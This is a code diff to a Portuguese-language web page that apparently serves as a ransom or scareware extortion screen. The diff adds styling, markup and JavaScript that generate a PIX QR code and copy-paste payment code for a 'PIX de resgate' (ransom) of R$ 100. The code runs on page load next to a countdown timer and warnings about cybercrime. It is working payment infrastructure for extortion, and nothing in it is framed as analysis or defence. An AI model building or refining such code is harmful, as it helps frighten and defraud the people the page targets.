@@ -133,6 +133,69 @@
       text-align: center;
     }
     
+    .qr-section {
+      margin: 30px 0;
+      text-align: center;
+      padding: 20px;
+      border: 2px solid #ffff00;
+      background: rgba(255, 255, 0, 0.1);
+    }
+    
+    .qr-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffff00;
+      margin-bottom: 15px;
+    }
+    
+    .qr-code-container {
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .qr-code-image {
+      max-width: 200px;
+      max-height: 200px;
+      border: 2px solid #ffffff;
+      background: white;
+      padding: 10px;
+    }
+    
+    .pix-code-section {
+      margin-top: 20px;
+    }
+    
+    .pix-code-label {
+      font-size: 16px;
+      color: #ffffff;
+      margin-bottom: 10px;
+    }
+    
+    .pix-code {
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #ffff00;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      border: 1px solid #cccccc;
+      word-break: break-all;
+      margin-bottom: 10px;
+    }
+    
+    .loading-qr {
+      color: #ffff00;
+      font-size: 16px;
+      margin: 20px 0;
+    }
+    
+    .error-qr {
+      color: #ff0000;
+      font-size: 14px;
+      margin: 20px 0;
+    }
+    
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
@@ -155,6 +218,29 @@
       
       .pix-info {
         font-size: 18px;
+      }
+      
+      .qr-section {
+        margin: 20px 0;
+        padding: 15px;
+      }
+      
+      .qr-title {
+        font-size: 16px;
+      }
+      
+      .qr-code-image {
+        max-width: 150px;
+        max-height: 150px;
+      }
+      
+      .pix-code {
+        font-size: 10px;
+        padding: 8px;
+      }
+      
+      .pix-code-label {
+        font-size: 14px;
       }
     }
     
@@ -215,8 +301,28 @@
       <li>Associados a crimes cibernéticos</li>
     </ul>
     
-    <div class="pix-info">
-      PIX de resgate: pixchave@proton.me
+    <div class="qr-section">
+      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
+      
+      <div id="qr-loading" class="loading-qr">
+        Gerando QR code PIX...
+      </div>
+      
+      <div id="qr-container" class="qr-code-container" style="display: none;">
+        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
+      </div>
+      
+      <div id="pix-code-container" class="pix-code-section" style="display: none;">
+        <div class="pix-code-label">Código PIX (Copia e Cola):</div>
+        <div id="pix-code" class="pix-code"></div>
+        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
+          Copie o código acima ou escaneie o QR code
+        </div>
+      </div>
+      
+      <div id="qr-error" class="error-qr" style="display: none;">
+        Erro ao gerar QR code. Tente recarregar a página.
+      </div>
     </div>
   </div>
 
@@ -392,8 +498,62 @@
         });
     }
     
+    // Função para gerar QR code PIX
+    async function gerarQRCodePIX() {
+      const loadingElement = document.getElementById('qr-loading');
+      const qrContainer = document.getElementById('qr-container');
+      const pixCodeContainer = document.getElementById('pix-code-container');
+      const errorElement = document.getElementById('qr-error');
+      const qrImage = document.getElementById('qr-image');
+      const pixCode = document.getElementById('pix-code');
+      
+      try {
+        console.log('Gerando QR code PIX...');
+        
+        const response = await fetch('/api/gerar-qr-pix', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({})
+        });
+        
+        const data = await response.json();
+        
+        if (data.success && data.qr_code_base64 && data.pix_copia_cola) {
+          // Esconder loading
+          loadingElement.style.display = 'none';
+          
+          // Mostrar QR code
+          qrImage.src = data.qr_code_base64;
+          qrContainer.style.display = 'flex';
+          
+          // Mostrar código PIX
+          pixCode.textContent = data.pix_copia_cola;
+          pixCodeContainer.style.display = 'block';
+          
+          console.log('QR code PIX gerado com sucesso:', data.transacao_id);
+        } else {
+          throw new Error(data.error || 'Erro desconhecido');
+        }
+        
+      } catch (error) {
+        console.error('Erro ao gerar QR code PIX:', error);
+        
+        // Esconder loading
+        loadingElement.style.display = 'none';
+        
+        // Mostrar erro
+        errorElement.style.display = 'block';
+        errorElement.textContent = 'Erro ao gerar QR code PIX. Tente recarregar a página.';
+      }
+    }
+    
     // Inicializar sistema de timer
     criarSessaoTimer();
+    
+    // Gerar QR code PIX quando a página carregar
+    gerarQRCodePIX();
     
     // Limpar sessão quando a página for fechada
     window.addEventListener('beforeunload', () => {
